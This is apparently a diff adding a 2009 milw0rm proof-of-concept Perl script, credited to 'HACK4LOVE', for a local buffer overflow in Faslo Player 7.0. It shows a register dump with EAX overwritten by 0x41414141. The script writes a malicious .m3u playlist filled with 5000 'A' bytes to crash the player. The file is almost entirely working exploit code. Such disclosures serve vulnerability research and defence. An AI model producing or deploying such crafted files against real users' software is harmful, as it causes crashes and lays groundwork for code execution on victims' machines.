@@ -1,0 +1,22 @@
+#!/usr/bin/perl
+# Found By :: HACK4LOVE
+# hack4love@hotmail.com
+# Faslo Player 7.0 (.m3u) Local Buffer Overflow PoC
+# http://www.rspq.org/faslo/fs7setup.exe
+############################################################
+##EAX 41414141
+##ECX 004A7CB0 faslow.004A7CB0
+##EDX 00145920
+##EBX 00000000
+##ESP 0012F5B0
+##EBP 0012FC84
+##ESI 003F9BC9
+##EDI 003F9BC9
+##EIP 73DD526E MFC42.73DD526E
+#############################################################
+my $crash="\x41" x 5000;
+open(myfile,'>>hack4love.m3u');
+print myfile $crash;
+##############################################################
+
+# milw0rm.com [2009-08-24]
